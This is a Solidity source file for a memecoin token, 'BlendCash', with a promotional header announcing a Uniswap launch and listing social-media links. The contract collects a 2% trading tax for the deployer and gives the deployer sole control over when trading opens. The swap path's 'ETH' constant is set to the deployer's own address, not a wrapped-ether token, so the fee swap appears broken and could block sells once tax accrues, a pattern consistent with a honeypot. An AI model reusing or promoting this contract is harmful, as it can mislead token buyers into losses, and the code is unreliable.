/**

📌Launch time: December 15th - 15:00 PM UTC (Uniswap)

👥 Telegram
https://t.me/BlendCashEth
✖️ Twitter 
https://x.com/BlendCash
Ⓜ️ Medium
https://medium.com/@BlendCash
🖥 Website
https://blendcash.pro

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.21;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract BlendCash {
    string public constant name = unicode"BlendCash";  //
    string public constant symbol = "Bcash";  //
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100000000 * 10**decimals;

    uint256 constant buyTax = 2;
    uint256 constant sellTax = 2;
    uint256 constant swapAmount = totalSupply / 100;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address private pair;
    address constant ETH = 0xD349AFb77f94d08662759dE5cFa2cbfCC06BeE7c;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable constant deployer = payable(address(0xD349AFb77f94d08662759dE5cFa2cbfCC06BeE7c)); //

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        require(tradingOpen || from == deployer || to == deployer);

        if(!tradingOpen && pair == address(0) && amount > 0)
            pair = to;

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
            swapping = true;
            address[] memory path = new  address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            deployer.transfer(address(this).balance);
            swapping = false;
        }

        if(from != address(this)){
            uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;
            amount -= taxAmount;
            balanceOf[address(this)] += taxAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(!tradingOpen);
        require(msg.sender == deployer);
        tradingOpen = true;        
    }
}